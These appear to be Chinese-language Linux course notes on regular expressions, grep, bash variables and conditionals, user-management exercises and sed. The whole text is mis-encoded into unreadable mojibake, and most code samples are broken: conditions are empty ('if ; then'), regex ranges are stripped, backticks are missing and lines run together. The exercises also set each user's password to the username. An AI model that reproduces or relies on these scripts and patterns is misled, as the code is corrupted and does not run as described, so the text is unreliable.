ï¼šåˆ†æ/etc/inittabæ–‡ä»¶ä¸­å¦‚ä¸‹æ–‡æœ¬ä¸­å‰ä¸¤è¡Œçš„ç‰¹å¾(æ¯ä¸€è¡Œä¸­å‡ºç°åœ¨æ•°å­—å¿…é¡»ç›¸åŒ)ï¼Œè¯·å†™å‡ºå¯ä»¥ç²¾ç¡®æ‰¾åˆ°ç±»ä¼¼ä¸¤è¡Œçš„æ¨¡å¼ï¼šl1:1:wait:/etc/rc.d/rc 1l3:3:wait:/etc/rc.d/rc 3grep â€˜^l():\\1.*\\1$â€™ /etc/inittabREGEXPï¼šREGular EXPressionPattern:æ­£åˆ™è¡¨è¾¾å¼ï¼šBasic REGEXPï¼šåŸºæœ¬Extended REGEXPï¼šæ‰©å±•åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ï¼š.:[]::æ¬¡æ•°åŒ¹é…ï¼š*:?: 0æˆ–1æ¬¡{m,n}ï¼šè‡³å°‘mæ¬¡ï¼Œè‡³å¤šnæ¬¡ï¼›.*:é”šå®šï¼š^:$:&lt;, \\b:&gt;, \\b:()\\1, \\2, \\3, â€¦grepï¼šä½¿ç”¨åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼å®šä¹‰çš„æ¨¡å¼æ¥è¿‡æ»¤æ–‡æœ¬çš„å‘½ä»¤ï¼›-i-v-oâ€“color-E: ä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼-A #:-B #:-C #:æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼ï¼šå­—ç¬¦åŒ¹é…ï¼š.[]æ¬¡æ•°åŒ¹é…ï¼š*:?:+: åŒ¹é…å…¶å‰é¢çš„å­—ç¬¦è‡³å°‘1æ¬¡{m,n}ä½ç½®é”šå®šï¼š^$&lt;&gt;åˆ†ç»„ï¼š()ï¼šåˆ†ç»„\\1, \\2, \\3, â€¦æˆ–è€…|: orC|cat: Catæˆ–cat, Cæˆ–catgrep -E = egrep4ã€æ˜¾ç¤ºæ‰€æœ‰ä»¥æ•°å­—ç»“å°¾ä¸”æ–‡ä»¶åä¸­ä¸åŒ…å«ç©ºç™½çš„æ–‡ä»¶ï¼›ls [^] ???æ‰¾å‡º/boot/grub/grub.confæ–‡ä»¶ä¸­1-255ä¹‹é—´çš„æ•°å­—ï¼›&lt;(||1|2|25)&gt;.ifconfig | egrep â€˜&lt;(||1|2|25)&gt;.&lt;(||1|2|25)&gt;.&lt;(||1|2|25)&gt;.&lt;(||1|2|25)&gt;â€™ifconfig | egrep --color â€˜(&lt;(||1|2|25)&gt;.){3}&lt;(||1|2|25)&gt;â€™IPv4:5ç±»ï¼šA B C D EAï¼š1-127Bï¼š128-191Cï¼š192-223&lt;(||1{2}|2|22)&gt;(.&lt;(||1|2|25)&gt;){2}.&lt;(||1|2|25)&gt;http://mageedu.blog.51cto.com/grep, egrepfgrep: ä¸æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼shellç¼–ç¨‹ï¼šç¼–è¯‘å™¨ï¼Œè§£é‡Šå™¨ç¼–ç¨‹è¯­è¨€ï¼šæœºå™¨è¯­è¨€ã€æ±‡ç¼–è¯­è¨€ã€é«˜çº§è¯­è¨€é™æ€è¯­è¨€ï¼šç¼–è¯‘å‹è¯­è¨€å¼ºç±»å‹(å˜é‡)äº‹å…ˆè½¬æ¢æˆå¯æ‰§è¡Œæ ¼å¼Cã€C++ã€JAVAã€C#åŠ¨æ€è¯­è¨€ï¼šè§£é‡Šå‹è¯­è¨€ï¼Œ on the flyå¼±ç±»å‹è¾¹è§£é‡Šè¾¹æ‰§è¡ŒPHPã€SHELLã€pythonã€perlé¢å‘è¿‡ç¨‹ï¼šShell, Cé¢å‘å¯¹è±¡: JAVA, Python, perl, C++å˜é‡ï¼šå†…å­˜ç©ºé—´ï¼Œå‘½åå†…å­˜ï¼šç¼–å€çš„å­˜å‚¨å•å…ƒè¿›ç¨‹ï¼š1+100ï¼š1+10000001å˜é‡ç±»å‹ï¼šäº‹å…ˆç¡®å®šæ•°æ®çš„å­˜å‚¨æ ¼å¼å’Œé•¿åº¦å­—ç¬¦æ•°å€¼æ•´å‹æµ®ç‚¹å‹: 11.23ï¼Œ 1.12310^1, 0.112310^22013/10/10, 64bit99999: 24bit,çœŸã€å‡é€»è¾‘ï¼š1+1&gt;2é€»è¾‘è¿ç®—ï¼šä¸ã€æˆ–ã€éã€å¼‚æˆ–1: çœŸ0: å‡1 &amp; 0 = 00 &amp; 1 = 00 &amp; 0 = 01 &amp; 1 = 1æˆ–ï¼šéï¼š! çœŸ = å‡! å‡ = çœŸshell: å¼±ç±»å‹ç¼–ç¨‹è¯­è¨€å¼ºï¼šå˜é‡åœ¨ä½¿ç”¨å‰ï¼Œå¿…é¡»äº‹å…ˆå£°æ˜ï¼Œç”šè‡³è¿˜éœ€è¦åˆå§‹åŒ–ï¼›å¼±ï¼šå˜é‡ç”¨æ—¶å£°æ˜ï¼Œç”šè‡³ä¸åŒºåˆ†ç±»å‹ï¼›å˜é‡èµ‹å€¼ï¼šVAR_NAME=VALUEbashå˜é‡ç±»å‹ï¼šç¯å¢ƒå˜é‡æœ¬åœ°å˜é‡(å±€éƒ¨å˜é‡)ä½ç½®å˜é‡ç‰¹æ®Šå˜é‡æœ¬åœ°å˜é‡ï¼šset VARNAME=VALUE: ä½œç”¨åŸŸä¸ºæ•´ä¸ªbashè¿›ç¨‹ï¼›å±€éƒ¨å˜é‡ï¼šlocal VARNAME=VALUEï¼šä½œç”¨åŸŸä¸ºå½“å‰ä»£ç æ®µï¼›ç¯å¢ƒå˜é‡ï¼šä½œç”¨åŸŸä¸ºå½“å‰shellè¿›ç¨‹åŠå…¶å­è¿›ç¨‹ï¼›export VARNAME=VALUEVARNAME=VALUEexport VARNAMEâ€œå¯¼å‡ºâ€ä½ç½®å˜é‡ï¼š$1, $2, â€¦ç‰¹æ®Šå˜é‡ï¼š$?: ä¸Šä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡ŒçŠ¶æ€è¿”å›å€¼ï¼›ç¨‹åºæ‰§è¡Œï¼Œå¯èƒ½æœ‰ä¸¤ç±»è¿”å›å€¼ï¼šç¨‹åºæ‰§è¡Œç»“æœç¨‹åºçŠ¶æ€è¿”å›ä»£ç ï¼ˆ0-255ï¼‰0: æ­£ç¡®æ‰§è¡Œ1-255ï¼šé”™è¯¯æ‰§è¡Œï¼Œ1ï¼Œ2ï¼Œ127ç³»ç»Ÿé¢„ç•™ï¼›è¾“å‡ºé‡å®šå‘ï¼š2&gt;2&gt;&gt;&amp;&gt;æ’¤æ¶ˆå˜é‡ï¼šunset VARNAMEæŸ¥çœ‹å½“shellä¸­å˜é‡ï¼šsetæŸ¥çœ‹å½“å‰shellä¸­çš„ç¯å¢ƒå˜é‡ï¼šprintenvenvexportè„šæœ¬ï¼šå‘½ä»¤çš„å †ç Œï¼ŒæŒ‰å®é™…éœ€è¦ï¼Œç»“åˆå‘½ä»¤æµç¨‹æ§åˆ¶æœºåˆ¶å®ç°çš„æºç¨‹åºshebang: é­”æ•°#!/bin/bash æ³¨é‡Šè¡Œï¼Œä¸æ‰§è¡Œ/dev/null: è½¯ä»¶è®¾å¤‡ï¼Œ bit bucketï¼Œæ•°æ®é»‘æ´è„šæœ¬åœ¨æ‰§è¡Œæ—¶ä¼šå¯åŠ¨ä¸€ä¸ªå­shellè¿›ç¨‹ï¼›å‘½ä»¤è¡Œä¸­å¯åŠ¨çš„è„šæœ¬ä¼šç»§æ‰¿å½“å‰shellç¯å¢ƒå˜é‡ï¼›ç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œçš„è„šæœ¬(éå‘½ä»¤è¡Œå¯åŠ¨)å°±éœ€è¦è‡ªæˆ‘å®šä¹‰éœ€è¦å„ç¯å¢ƒå˜é‡ï¼›ç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ï¼Œå®Œæˆä»¥ä¸‹ä»»åŠ¡1ã€æ·»åŠ 5ä¸ªç”¨æˆ·, user1,â€¦, user52ã€æ¯ä¸ªç”¨æˆ·çš„å¯†ç åŒç”¨æˆ·åï¼Œè€Œä¸”è¦æ±‚ï¼Œæ·»åŠ å¯†ç å®Œæˆåä¸æ˜¾ç¤ºpasswdå‘½ä»¤çš„æ‰§è¡Œç»“æœä¿¡æ¯ï¼›3ã€æ¯ä¸ªç”¨æˆ·æ·»åŠ å®Œæˆåï¼Œéƒ½è¦æ˜¾ç¤ºç”¨æˆ·æŸæŸå·²ç»æˆåŠŸæ·»åŠ ï¼›useradd user1echo â€œuser1â€ | passwd --stdin user1 &amp;&gt; /dev/nullecho â€œAdd user1 successfully.â€æ¡ä»¶åˆ¤æ–­ï¼šå¦‚æœç”¨æˆ·ä¸å­˜åœ¨æ·»åŠ ç”¨æˆ·ï¼Œç»™å¯†ç å¹¶æ˜¾ç¤ºæ·»åŠ æˆåŠŸï¼›å¦åˆ™æ˜¾ç¤ºå¦‚æœå·²ç»æ²¡åœ¨ï¼Œæ²¡æœ‰æ·»åŠ ï¼›bashä¸­å¦‚ä½•å®ç°æ¡ä»¶åˆ¤æ–­ï¼Ÿæ¡ä»¶æµ‹è¯•ç±»å‹ï¼šæ•´æ•°æµ‹è¯•å­—ç¬¦æµ‹è¯•æ–‡ä»¶æµ‹è¯•æ¡ä»¶æµ‹è¯•çš„è¡¨è¾¾å¼ï¼š[] test expression æ•´æ•°æ¯”è¾ƒ:-eq: æµ‹è¯•ä¸¤ä¸ªæ•´æ•°æ˜¯å¦ç›¸ç­‰ï¼›æ¯”å¦‚ $A -eq $B-ne: æµ‹è¯•ä¸¤ä¸ªæ•´æ•°æ˜¯å¦ä¸ç­‰ï¼›ä¸ç­‰ï¼Œä¸ºçœŸï¼›ç›¸ç­‰ï¼Œä¸ºå‡ï¼›-gt: æµ‹è¯•ä¸€ä¸ªæ•°æ˜¯å¦å¤§äºå¦ä¸€ä¸ªæ•°ï¼›å¤§äºï¼Œä¸ºçœŸï¼›å¦åˆ™ï¼Œä¸ºå‡ï¼›-lt: æµ‹è¯•ä¸€ä¸ªæ•°æ˜¯å¦å°äºå¦ä¸€ä¸ªæ•°ï¼›å°äºï¼Œä¸ºçœŸï¼›å¦åˆ™ï¼Œä¸ºå‡ï¼›-ge: å¤§äºæˆ–ç­‰äº-leï¼šå°äºæˆ–ç­‰äºå‘½ä»¤çš„é—´é€»è¾‘å…³ç³»ï¼šé€»è¾‘ä¸ï¼š &amp;&amp;ç¬¬ä¸€ä¸ªæ¡ä»¶ä¸ºå‡æ—¶ï¼Œç¬¬äºŒæ¡ä»¶ä¸ç”¨å†åˆ¤æ–­ï¼Œæœ€ç»ˆç»“æœå·²ç»æœ‰ï¼›ç¬¬ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸæ—¶ï¼Œç¬¬äºŒæ¡ä»¶å¿…é¡»å¾—åˆ¤æ–­ï¼›é€»è¾‘æˆ–ï¼š ||å¦‚æœç”¨æˆ·user6ä¸å­˜åœ¨ï¼Œå°±æ·»åŠ ç”¨æˆ·user6! id user6 &amp;&amp; useradd user6id user6 || useradd user6å¦‚æœ/etc/inittabæ–‡ä»¶çš„è¡Œæ•°å¤§äº100ï¼Œå°±æ˜¾ç¤ºå¥½å¤§çš„æ–‡ä»¶ï¼›&amp;&amp; echo â€œLarge file.â€å˜é‡åç§°ï¼š1ã€åªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œå¹¶ä¸”ä¸èƒ½æ•°å­—å¼€å¤´ï¼›2ã€ä¸åº”è¯¥è·Ÿç³»ç»Ÿä¸­å·²æœ‰çš„ç¯å¢ƒå˜é‡é‡åï¼›3ã€æœ€å¥½åšåˆ°è§åçŸ¥ä¹‰ï¼›å¦‚æœç”¨æˆ·å­˜åœ¨ï¼Œå°±æ˜¾ç¤ºç”¨æˆ·å·²å­˜åœ¨ï¼›å¦åˆ™ï¼Œå°±æ·»åŠ æ­¤ç”¨æˆ·ï¼›id user1 &amp;&amp; echo â€œuser1 exists.â€ || useradd user1å¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œå°±æ·»åŠ ï¼›å¦åˆ™ï¼Œæ˜¾ç¤ºå…¶å·²ç»å­˜åœ¨ï¼›! id user1 &amp;&amp; useradd user1 || echo â€œuser1 exists.â€å¦‚æœç”¨æˆ·ä¸å­˜åœ¨ï¼Œæ·»åŠ å¹¶ä¸”ç»™å¯†ç ï¼›å¦åˆ™ï¼Œæ˜¾ç¤ºå…¶å·²ç»å­˜åœ¨ï¼›! id user1 &amp;&amp; useradd user1 &amp;&amp; echo â€œuser1â€ | passwd --stdin user1 || echo â€œuser1 exists.â€ç»ƒä¹ ï¼Œå†™ä¸€ä¸ªè„šæœ¬ï¼Œå®Œæˆä»¥ä¸‹è¦æ±‚ï¼š1ã€æ·»åŠ 3ä¸ªç”¨æˆ·user1, user2, user3ï¼›ä½†è¦å…ˆåˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨è€Œåå†æ·»åŠ ï¼›2ã€æ·»åŠ å®Œæˆåï¼Œæ˜¾ç¤ºä¸€å…±æ·»åŠ äº†å‡ ä¸ªç”¨æˆ·ï¼›å½“ç„¶ï¼Œä¸èƒ½åŒ…æ‹¬å› ä¸ºäº‹å…ˆå­˜åœ¨è€Œæ²¡æœ‰æ·»åŠ çš„ï¼›3ã€æœ€åæ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸Šå…±æœ‰å¤šå°‘ä¸ªç”¨æˆ·ï¼›ç»ƒä¹ ï¼Œå†™ä¸€ä¸ªè„šæœ¬ï¼Œå®Œæˆä»¥ä¸‹è¦æ±‚ï¼šç»™å®šä¸€ä¸ªç”¨æˆ·ï¼š1ã€å¦‚æœå…¶UIDä¸º0ï¼Œå°±æ˜¾ç¤ºæ­¤ä¸ºç®¡ç†å‘˜ï¼›2ã€å¦åˆ™ï¼Œå°±æ˜¾ç¤ºå…¶ä¸ºæ™®é€šç”¨æˆ·ï¼›å¦‚æœ UIDä¸º0ï¼›é‚£ä¹ˆæ˜¾ç¤ºä¸ºç®¡ç†å‘˜å¦åˆ™æ˜¾ç¤ºä¸ºæ™®é€šç”¨æˆ·NAME=user16USERID=id -u $NAMEif ; thenecho â€œAdminâ€elseecho â€œcommon user.â€fiNAME=user16if ; thenecho â€œAdminâ€elseecho â€œcommon user.â€fiif id $NAME; thenç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬åˆ¤æ–­å½“å‰ç³»ç»Ÿä¸Šæ˜¯å¦æœ‰ç”¨æˆ·çš„é»˜è®¤shellä¸ºbashï¼›å¦‚æœæœ‰ï¼Œå°±æ˜¾ç¤ºæœ‰å¤šå°‘ä¸ªè¿™ç±»ç”¨æˆ·ï¼›å¦åˆ™ï¼Œå°±æ˜¾ç¤ºæ²¡æœ‰è¿™ç±»ç”¨æˆ·ï¼›grep &quot;bash\" /etc/passwd &> /dev/null RETVAL=?if ; thenif grep â€œbash$â€ /etc/passwd &amp;&gt; /dev/null; thenæç¤ºï¼šâ€œå¼•ç”¨â€ä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œè¦ä½¿ç”¨å‘½ä»¤å¼•ç”¨ï¼›æ¯”å¦‚: RESAULTS=wc -l /etc/passwd | cut -d: -f1ï¼›ä½¿ç”¨ä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡ŒçŠ¶æ€ç»“æœï¼Œè¦ç›´æ¥æ‰§è¡Œæ­¤å‘½ä»¤ï¼Œä¸€å®šä¸èƒ½å¼•ç”¨ï¼›æ¯”å¦‚: if id user1ä¸€å¥ä¸­çš„idå‘½ä»¤å°±ä¸€å®šä¸èƒ½åŠ å¼•å·ï¼›å¦‚æœæƒ³æŠŠä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œç»“æœèµ‹å€¼ç»™æŸå˜é‡ï¼Œè¦ä½¿ç”¨å‘½ä»¤å¼•ç”¨ï¼Œæ¯”å¦‚USERID=id -u user1;å¦‚æœæƒ³æŠŠä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡ŒçŠ¶æ€ç»“æœä¿å­˜ä¸‹æ¥ï¼Œå¹¶ä½œä¸ºå‘½ä»¤æ‰§è¡ŒæˆåŠŸä¸å¦çš„åˆ¤æ–­æ¡ä»¶ï¼Œåˆ™éœ€è¦å…ˆæ‰§è¡Œæ­¤å‘½ä»¤ï¼Œè€Œåå¼•ç”¨å…¶çŠ¶æ€ç»“æœï¼Œå¦‚id -u user1RETVAL=$?æ­¤å¥ç»å¯¹ä¸å¯ä»¥å†™ä¸ºRETVAL=id -u user1ï¼›ç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬åˆ¤æ–­å½“å‰ç³»ç»Ÿä¸Šæ˜¯å¦æœ‰ç”¨æˆ·çš„é»˜è®¤shellä¸ºbashï¼›å¦‚æœæœ‰ï¼Œå°±æ˜¾ç¤ºå…¶ä¸­ä¸€ä¸ªçš„ç”¨æˆ·åï¼›å¦åˆ™ï¼Œå°±æ˜¾ç¤ºæ²¡æœ‰è¿™ç±»ç”¨æˆ·ï¼›ç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ç»™å®šä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚/etc/inittabåˆ¤æ–­è¿™ä¸ªæ–‡ä»¶ä¸­æ˜¯å¦æœ‰ç©ºç™½è¡Œï¼›å¦‚æœæœ‰ï¼Œåˆ™æ˜¾ç¤ºå…¶ç©ºç™½è¡Œæ•°ï¼›å¦åˆ™ï¼Œæ˜¾ç¤ºæ²¡æœ‰ç©ºç™½è¡Œã€‚#!/bin/bashA=grep '^$' /etc/inittab | wc -lif ; thenecho â€œ$Aâ€elseecho â€œmeiyoukongbaihangâ€fiâ€”â€” by å¼ å¸…#!/bin/bashFILE=/etc/inittabif ; thenecho â€œNo $FILE.â€exit 8fiif grep â€œ^$â€ FILE &> /dev/null; then echo \"Total blank lines: `grep \"^&quot; $FILE | wc -l`.&quot;elseecho â€œNo blank line.â€fiç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ç»™å®šä¸€ä¸ªç”¨æˆ·ï¼Œåˆ¤æ–­å…¶UIDä¸GIDæ˜¯å¦ä¸€æ ·å¦‚æœä¸€æ ·ï¼Œå°±æ˜¾ç¤ºæ­¤ç”¨æˆ·ä¸ºâ€œgood guyâ€ï¼›å¦åˆ™ï¼Œå°±æ˜¾ç¤ºæ­¤ç”¨æˆ·ä¸ºâ€œbad guyâ€ã€‚#!/bin/bashUSERNAME=user1USERID=id -u $USERNAMEGROUPID=id -g $USERNAMEif ; thenecho â€œGood guy.â€elseecho â€œBad guy.â€fiè¿›ä¸€æ­¥è¦æ±‚ï¼šä¸ä½¿ç”¨idå‘½ä»¤è·å¾—å…¶idå·ï¼›#!/bin/bashUSERNAME=user1if ! grep â€œ^$USERNAME&gt;â€ /etc/passwd &amp;&gt; /dev/null; thenecho â€œNo such user: $USERNAME.â€exit 1fiUSERID=grep &quot;^$USERNAME\\&gt;&quot; /etc/passwd | cut -d: -f3GROUPID=grep &quot;^$USERNAME\\&gt;&quot; /etc/passwd | cut -d: -f4if ; thenecho â€œGood guy.â€elseecho â€œBad guy.â€fiç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ç»™å®šä¸€ä¸ªç”¨æˆ·ï¼Œè·å–å…¶å¯†ç è­¦å‘ŠæœŸé™ï¼›è€Œååˆ¤æ–­ç”¨æˆ·å¯†ç ä½¿ç”¨æœŸé™æ˜¯å¦å·²ç»å°äºè­¦å‘ŠæœŸé™ï¼›æç¤ºï¼šè®¡ç®—æ–¹æ³•ï¼Œæœ€é•¿ä½¿ç”¨æœŸé™å‡å»å·²ç»ä½¿ç”¨çš„å¤©æ•°å³ä¸ºå‰©ä½™ä½¿ç”¨æœŸé™ï¼›å¦‚æœå°äºï¼Œåˆ™æ˜¾ç¤ºâ€œWarningâ€ï¼›å¦åˆ™ï¼Œå°±æ˜¾ç¤ºâ€œOKâ€ã€‚åœ†æ•´ï¼šä¸¢å¼ƒå°æ•°ç‚¹åçš„æ‰€æœ‰å†…å®¹#!/bin/bashW=grep &quot;student&quot; /etc/shadow | cut -d: -f6S=date +%sT=expr $S/86400L=grep &quot;^student&quot; /etc/shadow | cut -d: -f5N=grep &quot;^student&quot; /etc/shadow | cut -d: -f3SY=[[[L-$]if ; thenecho â€˜Warningâ€™elseecho â€˜OKâ€™fi â€”â€” by è‘£åˆ©ä¸œ ç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬åˆ¤å®šå‘½ä»¤å†å²ä¸­å†å²å‘½ä»¤çš„æ€»æ¡ç›®æ˜¯å¦å¤§äº1000ï¼›å¦‚æœå¤§äºï¼Œåˆ™æ˜¾ç¤ºâ€œSome command will gone.â€ï¼›å¦åˆ™æ˜¾ç¤ºâ€œOKâ€ã€‚shellä¸­å¦‚ä½•è¿›è¡Œç®—æœ¯è¿ç®—ï¼šA=3B=61ã€let ç®—æœ¯è¿ç®—è¡¨è¾¾å¼let C=A+A+A+B2ã€C=C=C=3ã€((ç®—æœ¯è¿ç®—è¡¨è¾¾å¼)) C=((A+A+A+B))4ã€expr ç®—æœ¯è¿ç®—è¡¨è¾¾å¼ï¼Œè¡¨è¾¾å¼ä¸­å„æ“ä½œæ•°åŠè¿ç®—ç¬¦ä¹‹é—´è¦æœ‰ç©ºæ ¼ï¼Œè€Œä¸”è¦ä½¿ç”¨å‘½ä»¤å¼•ç”¨C=expr $A + $Bæ¡ä»¶åˆ¤æ–­ï¼Œæ§åˆ¶ç»“æ„ï¼šå•åˆ†æ”¯ifè¯­å¥if åˆ¤æ–­æ¡ä»¶; thenstatement1statement2â€¦fiåŒåˆ†æ”¯çš„ifè¯­å¥ï¼šif åˆ¤æ–­æ¡ä»¶; thenstatement1statement2â€¦elsestatement3statement4â€¦fiå¤šåˆ†æ”¯çš„ifè¯­å¥ï¼šif åˆ¤æ–­æ¡ä»¶1; thenstatement1â€¦elif åˆ¤æ–­æ¡ä»¶2; thenstatement2â€¦elif åˆ¤æ–­æ¡ä»¶3; thenstatement3â€¦elsestatement4â€¦fiæµ‹è¯•æ–¹æ³•ï¼š[]test expressionbashä¸­å¸¸ç”¨çš„æ¡ä»¶æµ‹è¯•æœ‰ä¸‰ç§ï¼šæ•´æ•°æµ‹è¯•ï¼š-gt-le-ne-eq-ge-ltINT1=63INT2=77[]test $INT1 -eq $INT2æ–‡ä»¶æµ‹è¯•ï¼š-e FILEï¼šæµ‹è¯•æ–‡ä»¶æ˜¯å¦å­˜åœ¨-f FILE: æµ‹è¯•æ–‡ä»¶æ˜¯å¦ä¸ºæ™®é€šæ–‡ä»¶-d FILE: æµ‹è¯•æŒ‡å®šè·¯å¾„æ˜¯å¦ä¸ºç›®å½•-r FILE: æµ‹è¯•å½“å‰ç”¨æˆ·å¯¹æŒ‡å®šæ–‡ä»¶æ˜¯å¦æœ‰è¯»å–æƒé™ï¼›-w-xç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ç»™å®šä¸€ä¸ªæ–‡ä»¶ï¼šå¦‚æœæ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œå°±æ˜¾ç¤ºä¹‹ï¼›å¦‚æœæ˜¯ä¸€ä¸ªç›®å½•ï¼Œäº¦æ˜¾ç¤ºä¹‹ï¼›å¦åˆ™ï¼Œæ­¤ä¸ºæ— æ³•è¯†åˆ«ä¹‹æ–‡ä»¶ï¼›å®šä¹‰è„šæœ¬é€€å‡ºçŠ¶æ€ç exit: é€€å‡ºè„šæœ¬exit #å¦‚æœè„šæœ¬æ²¡æœ‰æ˜ç¡®å®šä¹‰é€€å‡ºçŠ¶æ€ç ï¼Œé‚£ä¹ˆï¼Œæœ€åæ‰§è¡Œçš„ä¸€æ¡å‘½ä»¤çš„é€€å‡ºç å³ä¸ºè„šæœ¬çš„é€€å‡ºçŠ¶æ€ç ï¼›æµ‹è¯•è„šæœ¬æ˜¯å¦æœ‰è¯­æ³•é”™è¯¯ï¼šbash -n è„šæœ¬bash -x è„šæœ¬ï¼šå•æ­¥æ‰§è¡Œbashå˜é‡çš„ç±»å‹ï¼šæœ¬åœ°å˜é‡(å±€éƒ¨å˜é‡)ç¯å¢ƒå˜é‡ä½ç½®å˜é‡:$1, $2, â€¦shiftç‰¹æ®Šå˜é‡ï¼š$?$#ï¼šå‚æ•°çš„ä¸ªæ•°$*: å‚æ•°åˆ—è¡¨$@ï¼šå‚æ•°åˆ—è¡¨./filetest.sh /etc/fstab /etc/inittab$1: /etc/fstab$2: /etc/inittabç»ƒä¹ ï¼šå†™ä¸€è„šæœ¬èƒ½æ¥å—ä¸€ä¸ªå‚æ•°(æ–‡ä»¶è·¯å¾„)åˆ¤å®šï¼šæ­¤å‚æ•°å¦‚æœæ˜¯ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œå°±æ˜¾ç¤ºâ€œOK.â€ï¼›å¦åˆ™å°±æ˜¾ç¤º&quot;No such file.&quot;ç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ç»™è„šæœ¬ä¼ é€’ä¸¤ä¸ªå‚æ•°(æ•´æ•°)ï¼›æ˜¾ç¤ºæ­¤ä¸¤è€…ä¹‹å’Œï¼Œä¹‹ä¹˜ç§¯ï¼›#!/bin/bashif ; thenecho â€œUsage: cacl.sh ARG1 ARG2â€exit 8fiecho â€œThe sum is: $.â€echo â€œThe prod is: $.â€ç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ï¼Œå®Œæˆä»¥ä¸‹ä»»åŠ¡1ã€ä½¿ç”¨ä¸€ä¸ªå˜é‡ä¿å­˜ä¸€ä¸ªç”¨æˆ·åï¼›2ã€åˆ é™¤æ­¤å˜é‡ä¸­çš„ç”¨æˆ·ï¼Œä¸”ä¸€å¹¶åˆ é™¤å…¶å®¶ç›®å½•ï¼›3ã€æ˜¾ç¤ºâ€œç”¨æˆ·åˆ é™¤å®Œæˆâ€ç±»çš„ä¿¡æ¯ï¼›bash: å¼•ç”¨å˜é‡ï¼š${VARNAME}, æ‹¬å·æœ‰æ—¶å¯çœç•¥ã€‚æ•´å‹ï¼Œ8bit: 2560-255ï¼Œ æº¢å‡ºå˜é‡ï¼š1ï¼Œ1000010ï¼š16bit10: 1010, 8bitç¼–ç¨‹èƒ½åŠ›ï¼šè„šæœ¬ç¼–ç¨‹grep, sed(æµç¼–è¾‘å™¨), awksedåŸºæœ¬ç”¨æ³•ï¼šsed: Stream EDitorè¡Œç¼–è¾‘å™¨ (å…¨å±ç¼–è¾‘å™¨: vi)sed: æ¨¡å¼ç©ºé—´é»˜è®¤ä¸ç¼–è¾‘åŸæ–‡ä»¶ï¼Œä»…å¯¹æ¨¡å¼ç©ºé—´ä¸­çš„æ•°æ®åšå¤„ç†ï¼›è€Œåï¼Œå¤„ç†ç»“æŸåï¼Œå°†æ¨¡å¼ç©ºé—´æ‰“å°è‡³å±å¹•ï¼›sed â€˜AddressCommandâ€™ file â€¦-n: é™é»˜æ¨¡å¼ï¼Œä¸å†é»˜è®¤æ˜¾ç¤ºæ¨¡å¼ç©ºé—´ä¸­çš„å†…å®¹-i: ç›´æ¥ä¿®æ”¹åŸæ–‡ä»¶-e SCRIPT -e SCRIPT:å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªè„šæœ¬-f /PATH/TO/SED_SCRIPTsed -f /path/to/scripts file-r: è¡¨ç¤ºä½¿ç”¨æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼Addressï¼š1ã€StartLine,EndLineæ¯”å¦‚1,100$ï¼šæœ€åä¸€è¡Œ2ã€/RegExp//^root/3ã€/pattern1/,/pattern2/ç¬¬ä¸€æ¬¡è¢«pattern1åŒ¹é…åˆ°çš„è¡Œå¼€å§‹ï¼Œè‡³ç¬¬ä¸€æ¬¡è¢«pattern2åŒ¹é…åˆ°çš„è¡Œç»“æŸï¼Œè¿™ä¸­é—´çš„æ‰€æœ‰è¡Œ4ã€LineNumberæŒ‡å®šçš„è¡Œ5ã€StartLine, +Nä»startLineå¼€å§‹ï¼Œå‘åçš„Nè¡Œï¼›Commandï¼šd: åˆ é™¤ç¬¦åˆæ¡ä»¶çš„è¡Œï¼›p: æ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„è¡Œï¼›a \\string: åœ¨æŒ‡å®šçš„è¡Œåé¢è¿½åŠ æ–°è¡Œï¼Œå†…å®¹ä¸ºstring\\nï¼šå¯ä»¥ç”¨äºæ¢è¡Œi \\string: åœ¨æŒ‡å®šçš„è¡Œå‰é¢æ·»åŠ æ–°è¡Œï¼Œå†…å®¹ä¸ºstringr FILE: å°†æŒ‡å®šçš„æ–‡ä»¶çš„å†…å®¹æ·»åŠ è‡³ç¬¦åˆæ¡ä»¶çš„è¡Œå¤„w FILE: å°†åœ°å€æŒ‡å®šçš„èŒƒå›´å†…çš„è¡Œå¦å­˜è‡³æŒ‡å®šçš„æ–‡ä»¶ä¸­;s/pattern/string/ä¿®é¥°ç¬¦: æŸ¥æ‰¾å¹¶æ›¿æ¢ï¼Œé»˜è®¤åªæ›¿æ¢æ¯è¡Œä¸­ç¬¬ä¸€æ¬¡è¢«æ¨¡å¼åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²åŠ ä¿®é¥°ç¬¦g: å…¨å±€æ›¿æ¢i: å¿½ç•¥å­—ç¬¦å¤§å°å†™s///: s###, s@@@(), \\1, \\2l..e: like--&gt;liker love--&gt;lover like--&gt;Like love--&gt;Love 